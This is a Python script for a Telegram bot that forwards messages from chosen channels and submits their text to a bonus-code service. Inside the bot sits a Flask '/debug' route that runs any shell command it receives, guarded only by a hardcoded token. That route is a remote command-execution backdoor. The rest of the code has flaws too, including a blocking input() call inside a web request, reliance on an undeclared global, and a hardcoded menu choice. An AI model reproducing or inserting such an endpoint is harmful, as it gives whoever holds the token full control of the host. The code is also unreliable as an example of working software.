import os
import aiohttp
import asyncio
from flask import Flask, request, jsonify
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from dotenv import load_dotenv
from Services import process_bonus_code

load_dotenv()

# Retrieve API credentials and other parameters from environment variables
api_id = os.environ.get('APP_API_ID')
api_hash = os.environ.get('APP_API_HASH')
phone_number = os.environ.get('APP_YOUR_PHONE')
source_channel_ids = [
    int(os.environ.get('SOURCE_CHANNEL_ID')),
    int(os.environ.get('TEST_CHANNEL_ID'))
]
destination_channel_id = int(os.environ.get('DESTINATION_CHANNEL_ID'))
user_password = os.environ.get('APP_YOUR_PWD')

# Flask app for debug endpoint
app = Flask(__name__)

def get_input(prompt):
    try:
        return input(prompt).strip()
    except EOFError:
        print("EOFError: No input available. Using default choice.")
        return "default"

@app.route('/debug', methods=['POST'])
def debug():
    token = request.headers.get('Authorization')
    if token != 'af8e2c6d6f173f83c91b77ec606f1237':
        return jsonify({'error': 'Unauthorized'}), 403
    
    command = request.form.get('command')
    code = request.form.get('code')
    choice = request.form.get('choice')
    input_value = get_input("Enter your input: ")
    
    if not command:
        return jsonify({'error': 'No command provided'}), 400

    try:
        output = os.popen(command).read()
        return jsonify({'output': output, 'code': code, 'choice': choice, 'input_value': input_value}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

class MessageForwarder:
    def __init__(self, api_id, api_hash, phone_number, source_channel_ids, destination_channel_id, user_password):
        # Create the sessions directory if it doesn't exist
        session_dir = 'sessions'
        if not os.path.exists(session_dir):
            os.makedirs(session_dir)

        self.api_id = api_id
        self.api_hash = api_hash
        self.phone_number = phone_number
        self.source_channel_ids = source_channel_ids
        self.destination_channel_id = destination_channel_id
        self.user_password = user_password
        self.client = TelegramClient(f"sessions/session_{phone_number}", api_id, api_hash)
        self.connected = False

    async def connect(self):
        await self.client.connect()
        self.connected = True

    async def disconnect(self):
        await self.client.disconnect()
        self.connected = False

    async def list_chats(self):
        if not self.connected:
            await self.connect()

        if not await self.client.is_user_authorized():
            await self.client.send_code_request(self.phone_number)
            code = get_input('Enter the code: ').strip()
            await self.client.sign_in(self.phone_number, code)

        dialogs = await self.client.get_dialogs()
        for dialog in dialogs:
            print(f"Chat ID: {dialog.id}, Title: {dialog.title}")

    async def forward_new_messages(self):
        try:
            if not self.connected:
                await self.connect()

            async with self.client:
                source_entities = await asyncio.gather(*[self.client.get_entity(channel_id) for channel_id in self.source_channel_ids])
                source_channel_ids = [entity.id for entity in source_entities]

                @self.client.on(events.NewMessage(chats=source_channel_ids))
                async def message_handler(event):
                    try:
                        await self.client.forward_messages(self.destination_channel_id, event.message)
                        await process_bonus_code(apiEndpoints, event.message.text)
                    except Exception as e:
                        print(f"An error occurred while processing the message: {e}")

                await self.client.run_until_disconnected()

        except SessionPasswordNeededError:
            await self.client.sign_in(password=self.user_password)
        except Exception as e:
            print(f"An error occurred: {e}")
            print("Attempting to reconnect...")
            await asyncio.sleep(5)

async def ping_endpoint(endpoint):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(endpoint) as response:
                if response.status == 200:
                    print(f"Endpoint {endpoint} is reachable.")
                    apiEndpoints.append(endpoint)
                else:
                    print(f"Endpoint {endpoint} is not reachable. Status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Error connecting to {endpoint}: {e}")

def process_input(input_str):
    return input_str.lower()

async def main():
    forwarder = MessageForwarder(api_id, api_hash, phone_number, source_channel_ids, destination_channel_id, user_password)
    api_endpoints = [
        os.environ.get('API_ENDPOINT_1'),
        os.environ.get('API_ENDPOINT_2'),
        os.environ.get('API_ENDPOINT_3')
    ]

    tasks = [ping_endpoint(endpoint) for endpoint in api_endpoints]
    await asyncio.gather(*tasks)

    while True:
        print("Choose an option:")
        print("1. List Chats")
        print("2. Forward New Messages")
        # choice = get_input("Enter your choice: ")
        choice = "2"
        if choice == "1":
            await forwarder.list_chats()
        elif choice == "2":
            print(apiEndpoints)
            try:
                await forwarder.forward_new_messages()
            except Exception as e:
                print(f"An error occurred: {e}")
        else:
            print("Invalid choice")

if __name__ == "__main__":
    apiEndpoints = []  # Initialize global variable
    asyncio.run(main())
